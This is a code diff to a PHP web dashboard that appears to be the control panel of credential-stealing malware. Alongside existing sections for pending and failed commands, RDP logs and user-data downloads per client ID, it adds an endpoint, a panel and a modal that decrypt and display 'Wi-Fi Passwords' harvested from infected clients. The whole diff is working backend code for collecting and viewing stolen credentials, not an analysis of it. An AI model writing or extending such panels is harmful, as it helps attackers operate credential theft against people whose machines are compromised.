@@ -243,6 +243,29 @@ if (isset($_GET['get_vm_status']) && $logged_in) {
     exit;
 }
 
+if (isset($_GET['get_wifi_logs']) && $logged_in) {
+    header('Content-Type: application/json; charset=utf-8');
+    try {
+        $stmt = $pdo->query("
+            SELECT id, client_id, message, created_at
+            FROM client_logs
+            WHERE log_type = 'wifi'
+            ORDER BY created_at DESC LIMIT 100
+        ");
+        $wifi_logs = $stmt->fetchAll();
+
+        foreach ($wifi_logs as &$log) {
+            $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
+        }
+
+        echo json_encode(['wifi_logs' => $wifi_logs], JSON_UNESCAPED_UNICODE);
+    } catch (PDOException $e) {
+        error_log("Failed to fetch Wi-Fi logs: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        echo json_encode(['error' => 'Failed to fetch Wi-Fi logs: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
+    }
+    exit;
+}
+
 if (isset($_GET['get_rdp_logs']) && $logged_in) {
     header('Content-Type: application/json; charset=utf-8');
     try {
@@ -559,6 +582,10 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                     <h2 class="text-2xl font-semibold text-yellow-400 mb-4">Pending Commands</h2>
                     <div id="pending-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
+                <div class="glass-card rounded-xl p-6">
+                    <h2 class="text-2xl font-semibold text-indigo-400 mb-4">Wi-Fi Passwords</h2>
+                    <div id="wifi-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
+                </div>
                 <!-- Failed logs -->
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-red-400 mb-4">Failed Commands</h2>
@@ -613,6 +640,22 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                         <p><strong>Created At:</strong> <span id="rdp-modal-created-at"></span></p>
                         <div>
                             <textarea class="editor" id="rdp-modal-content" readonly></textarea>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="wifi-modal" class="modal">
+                <div class="modal-content">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-2xl font-semibold text-indigo-400">Wi-Fi Password Details</h2>
+                        <button id="close-wifi-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
+                    </div>
+                    <div class="space-y-2">
+                        <p><strong>Client ID:</strong> <span id="wifi-modal-client-id"></span></p>
+                        <p><strong>Created At:</strong> <span id="wifi-modal-created-at"></span></p>
+                        <div>
+                            <textarea class="editor" id="wifi-modal-content" readonly></textarea>
                         </div>
                     </div>
                 </div>
@@ -864,6 +907,65 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
 
                 modal.style.display = 'block';
             }
+
+            fetch('?get_wifi_logs', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        console.error(data.error);
+                        return;
+                    }
+
+                    const wifiLogs = document.getElementById('wifi-logs');
+                    wifiLogs.innerHTML = '';
+
+                    data.wifi_logs.forEach(log => {
+                        const logElement = document.createElement('div');
+                        logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
+                        logElement.dataset.log = JSON.stringify(log);
+                        let parsedData;
+                        try {
+                            parsedData = JSON.parse(log.message);
+                        } catch (e) {
+                            parsedData = {
+                                wifi_profiles: []
+                            };
+                        }
+                        const profileCount = parsedData.wifi_profiles ? parsedData.wifi_profiles.length : 0;
+                        logElement.innerHTML = `
+            <p class="text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</p>
+            <p class="text-gray-200"><strong>Client ID:</strong> ${log.client_id}</p>
+            <p class="text-gray-200"><strong>Networks:</strong> ${profileCount} found</p>
+        `;
+                        logElement.addEventListener('click', () => openWifiModal(log));
+                        wifiLogs.appendChild(logElement);
+                    });
+                })
+                .catch(error => console.error('Error fetching Wi-Fi logs:', error));
+
+            function openWifiModal(log) {
+                const modal = document.getElementById('wifi-modal');
+                document.getElementById('wifi-modal-client-id').textContent = log.client_id;
+                document.getElementById('wifi-modal-created-at').textContent = new Date(log.created_at).toLocaleString();
+                document.getElementById('wifi-modal-content').value = log.message || '{}';
+
+                modal.style.display = 'block';
+            }
+
+            document.getElementById('close-wifi-modal').addEventListener('click', () => {
+                document.getElementById('wifi-modal').style.display = 'none';
+            });
+
+            window.addEventListener('click', (event) => {
+                if (event.target === document.getElementById('wifi-modal')) {
+                    document.getElementById('wifi-modal').style.display = 'none';
+                }
+            });
 
             function openDataModal(data) {
                 const modal = document.getElementById('data-modal');
